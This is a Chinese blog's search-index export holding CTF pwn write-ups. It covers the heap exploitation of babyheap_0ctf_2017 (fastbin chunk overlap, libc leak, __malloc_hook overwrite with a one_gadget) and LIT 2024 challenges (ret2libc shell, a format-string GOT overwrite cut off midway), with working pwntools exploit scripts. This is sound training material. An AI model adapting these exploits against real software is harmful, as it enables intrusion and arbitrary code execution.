<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[BUUCTF]PWN——babyheap_0ctf_2017</title>
    <url>/2024/07/17/buuctf-pwn%E2%80%94%E2%80%94babyheap-0ctf-2017/</url>
    <content><![CDATA[<p>首先查看保护</p>
<p><img src="https://s2.loli.net/2024/08/19/spICMFTbBlDW1dE.png" alt="557822afedec40a936b1ccdafd9fe8ce.png"></p>
<p>全开是吧！！！</p>
<p>放神的武器ida里面看看</p>
<p>main函数一眼，菜单题</p>
<p><img src="https://s2.loli.net/2024/08/19/zpTu1V2djsnq6Ui.png" alt="5230ec33334c28d704b55ebdc232fb8f.png"></p>
<p>add函数就很正常，调用calloc函数来申请堆块。（calloc函数和malloc函数的区别就是是否进行初始化，虽然calloc初始化看着更安全点，但是性能特别慢，而且在实际环境中好多变量都不需要进行初始化）</p>
<p><img src="https://s2.loli.net/2024/08/19/SIuNGD4h27bemKA.png" alt="762cd5e36728edefadd54c99357b2654.png"></p>
<p>edit函数，发现一个问题就是size没有做限制，但有个loophole函数</p>
<p><img src="https://s2.loli.net/2024/08/19/IjgY2ibzqMnE5Gm.png" alt="f8639f0301459ad82bf6e50b00023e57.png"></p>
<p>好吧，就是正常的读</p>
<p><img src="https://s2.loli.net/2024/08/19/4hCuPOJGsmLcSDz.png" alt="3bb28a0228f1eca04e80c9cde43bc63c.png"></p>
<p>delete函数，很标准，没有uaf。</p>
<p><img src="https://s2.loli.net/2024/08/19/pl5T6OUYswDWXaN.png" alt="53c904a44c237cdaa026a029e3f57ac7.png"></p>
<p>show函数也很正常</p>
<p><img src="https://s2.loli.net/2024/08/19/jqMRIOSUw3zohtp.png" alt="b8a45a519af11fb31ed058a0eb74a411.png"></p>
<p>很正常的输出</p>
<p><img src="https://s2.loli.net/2024/08/19/IjgY2ibzqMnE5Gm.png" alt="f8639f0301459ad82bf6e50b00023e57.png"></p>
<h5 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h5><p> 分析完，有那个无线长度编辑。</p>
<h5 id="分析exp"><a href="#分析exp" class="headerlink" title="分析exp"></a>分析exp</h5><p>申请5个chunk，在free掉chunk_1，chunk_2。在修改chunk_2的fd指针的低两字节的值为0x80，将其修改为chunk_4的地址，在修改chunk_4的size位为0x21。</p>
<p><img src="https://s2.loli.net/2024/08/19/f1FoqbDwnyOjzh2.png" alt="b523610d56a3295b5c3e05d3baeae585.png"></p>
<p><a href="https://s2.loli.net/2024/08/19/UcuCsNIbVmL2HzF.png">50315c790ba99b46f8f72f37490c146a.png</a></p>
<p>此时查看fastbins，此时fastbins里面有两个chunk，一个是chunk_4,一个是chunk_2</p>
<p><img src="https://s2.loli.net/2024/08/19/N7l1nW9if3K6jOB.png" alt="3a0c60cbced8ca6c16c91223aae8c598.png"></p>
<p>在申请回来两个chunk，利用fastbins后进先出。现在chunk_4和chunk_2堆重叠了。</p>
<p><img src="https://s2.loli.net/2024/08/19/pahQ5JBbmf7LP3D.png" alt="6ecaf84124c019d6ddfe460f36e27025.png"></p>
<p>在恢复chunk_4的size大小,再申请一小块内存，防止你后面delete chunk_4的时候其与top chunk合并</p>
<p><img src="https://s2.loli.net/2024/08/19/jW2M8Owax7dTX3f.png" alt="90dae465ef57556d97a7235da0039194.png"></p>
<p>现在delete chunk_4，其会进入到unsortbins里面，接下来就是套路了。</p>
<p><img src="https://s2.loli.net/2024/08/19/Nzm9jpiFIac1Buo.png" alt="76100a7ca52f734243be622dc08a5717.png"></p>
<p>泄露main_arena后面进而得到libc_base的值，后面malloc_hook那里找到一块0x7f的内存，来供我申请chunk。该怎么找呢？可以看我的另一篇文章（刚写完，哈哈哈哈哈）。在这里不赘述了。</p>
<p><img src="https://s2.loli.net/2024/08/19/DQlNR6c4IY1i72s.png" alt="3f5541b4e72311951ddbcaa4d6da5512.png"></p>
<p>找申请的chunk位置，fakechunk。最后再利用我们的fastbins的手法，申请回来chunk_4的内存，但不要全部申请完，因为如果我直接申请一个0x80，后面delete的时候它会进入到unsortbins里面，不好利用。</p>
<p><img src="https://s2.loli.net/2024/08/19/Pb6vSaA4DRFI3Ue.png" alt="0d76a8c8747cc16bc036376e27334a66.png"></p>
<p>因为chunk_2和chunk_4重叠，所以我可以修改这个free的chunk_4的内容，将其fd指针改成我的fake_chunk的位置</p>
<p><img src="https://s2.loli.net/2024/08/19/MA2BRl5CKYf4Uzx.png" alt="aabd2aed0077f51a6326151e96d17f0e.png"></p>
<p>最后就是申请到我们的fake_chunk的内容，进而修改，malloc_hook为one_gadget的值。</p>
<p>小白肯定好奇为啥，用的是calloc为啥修改malloc，因为调用calloc会使用到malloc。还有疑惑这个</p>
<p><img src="https://s2.loli.net/2024/08/19/6PwDAZvIQjY9nNf.png" alt="48b63d8595a19fe96d58cc5a19667504.png">怎么得到的呢。你看看上一张图哪个后面-0x1b。你这个offset就是0x1b-0x8。</p>
<p><img src="https://s2.loli.net/2024/08/19/JQGsTuN52vpLUAw.png" alt="ba05438be2f3f04a8ca83c1c24c406bc.png"></p>
<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p><img src="https://s2.loli.net/2024/08/19/s5lZ42Ee86zDbjS.png" alt="754c9bf197db17ed97a24555cca3b767.png"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/environment/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"</span><span class="token punctuation">)</span>
    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so")</span>
    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.23.so")</span>
    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_i386/libc-2.23.so")</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># io.recvuntil("\n")</span>
        <span class="token comment"># io.sendline(name)</span>
        <span class="token comment"># io.recvuntil("\n")</span>
        <span class="token comment"># io.sendline(content)</span>

    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    padding <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> padding<span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>

    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>padding<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1 这个把原来chunk_2申请回来了</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2 这个chunk其实和4号重叠了</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># 恢复chunk_4的size大小</span>

    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment"># 5防止其与topchunk合并的</span>
    
    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#chunk被放到了unsortbins里面</span>

    show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    unsortbins_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unsortbins_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>unsortbins_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    main_arena <span class="token operator">=</span> unsortbins_addr <span class="token operator">-</span> <span class="token number">0x58</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arena = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    malloc_hook <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x10</span>
    libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#4 申请不可以大于0x80，防止你后面chunk4进入到unsortbins里面</span>
    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment"># 这一步申请回来主要是为了让chunk4进入到fastbins里面</span>
    
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#5 将上一步申请的chunk给得到</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#6 得到我们的fake chunk</span>

    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'one_gadget = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>

    gdb<span class="token punctuation">(</span><span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>​                                                                                                                                                                                                            </p>
]]></content>
      <categories>
        <category>做题笔记</category>
        <category>积累</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>LIT - CTF - PWN部分题解</title>
    <url>/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<h2 id="LIT-2024"><a href="#LIT-2024" class="headerlink" title="LIT 2024"></a>LIT 2024</h2><p>Hi everyone,</p>
<p> We have some updates about Standard Round.</p>
<p> Due to unforeseen circumstances, <strong>we will be delaying the Standard Round by a week (contest window will be open from Aug 16-20)</strong>. We want to provide high quality problems for our contestants, and the extra time will allow us to finish preparing and testing the problems and the platform. <strong>CTF will still be running at the original planned time</strong>, and we hope you will enjoy the challenges we have written this year!</p>
</blockquote>
<p><strong>目录</strong></p>
<p><a href="#%E5%89%8D%E8%A8%80">前言</a></p>
<p>[LIT 2024](#LIT 2024)</p>
<p>[pwn&#x2F;Function Pairing]</p>
<p>[pwn&#x2F;Infinite Echo]</p>
<p>[pwn&#x2F;recurse]</p>
<p>[pwn&#x2F;w4dup 2de ]</p>
<p>[ pwn&#x2F;iloveseccomp]</p>
<p>[pwn&#x2F;How to Raise a Boring Vuln Flat]</p>
<hr>
<h5 id="pwn-Function-Pairing"><a href="#pwn-Function-Pairing" class="headerlink" title="pwn&#x2F;Function Pairing"></a>pwn&#x2F;Function Pairing</h5><blockquote>
<p>I love how functions in C are named! We have: - open and close - fopen and fclose - read and write - fread and fwrite - gets and puts - fgets and fputs Connect with nc litctf.org 31774</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/08/19/rYVxRhFP815bj3y.png" alt="f5b5f71d9a73479c9d8c95dcdf0e4032.png"></p>
<p>第一个gets有栈溢出。再利用puts函数泄露出来libc之后ret2libc。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    main <span class="token operator">=</span> <span class="token number">0x401196</span>
    fgets_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'fgets'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401293</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    ru<span class="token punctuation">(</span><span class="token string">"1. gets/puts\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fgets_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"2. fgets/fputs"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    ru<span class="token punctuation">(</span><span class="token string">"a\n"</span><span class="token punctuation">)</span>
    fgets <span class="token operator">=</span> u68<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"fgets"</span><span class="token punctuation">,</span>fgets<span class="token punctuation">)</span>

    libc_base <span class="token operator">=</span> fgets <span class="token operator">-</span> <span class="token number">0x7f380</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x50d70</span>
    sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1d8678</span>

    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"1. gets/puts\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    ru<span class="token punctuation">(</span><span class="token string">"2. fgets/fputs"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/JGt3MsEvUV4pyDf.png" alt="7d5a82e052a142ea9896511f510cad64.png"></p>
<h5 id="pwn-Infinite-Echo"><a href="#pwn-Infinite-Echo" class="headerlink" title="pwn&#x2F;Infinite Echo"></a>pwn&#x2F;Infinite Echo</h5><blockquote>
<p>You <em>got</em> this! Connect with nc litctf.org 31772.</p>
</blockquote>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;unistd.h></span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>stdout<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>stderr<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Infinite Echo!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    buf<span class="token punctuation">[</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>给了c源码，可以看到明显的格式化字符串漏洞。</p>
<p><img src="https://s2.loli.net/2024/08/19/Ju4zFyPS5Qaksxm.png" alt="1197ad36fd9a423198a77257b585476b.png"></p>
<p>检查保护，可以修改got表</p>
<p><img src="https://s2.loli.net/2024/08/19/Xi79DuYBItT5GSj.png" alt="0735383487ad44349f285b1dfe42358b.png"></p>
<p>因为是在栈上的，分别泄露出libc_base和基地址base，之后把printf_got表部署到栈上，来进行修改。也可以利用fmtstr_payload进行修改，offset &#x3D; 6。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 

    ru<span class="token punctuation">(</span><span class="token string">"Infinite Echo!\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"%34$p-%37$p-"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1f12e8</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10e0</span>
    lg<span class="token punctuation">(</span><span class="token string">"base"</span><span class="token punctuation">,</span>base<span class="token punctuation">)</span>

    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
    printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span> <span class="token operator">+</span> base
    lg<span class="token punctuation">(</span><span class="token string">"printf_got"</span><span class="token punctuation">,</span>printf_got<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span>
   
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    s1 <span class="token operator">=</span> <span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span>
    s2 <span class="token operator">=</span> <span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    lg<span class="token punctuation">(</span><span class="token string">"s1"</span><span class="token punctuation">,</span>s1<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"s2"</span><span class="token punctuation">,</span>s2<span class="token punctuation">)</span>
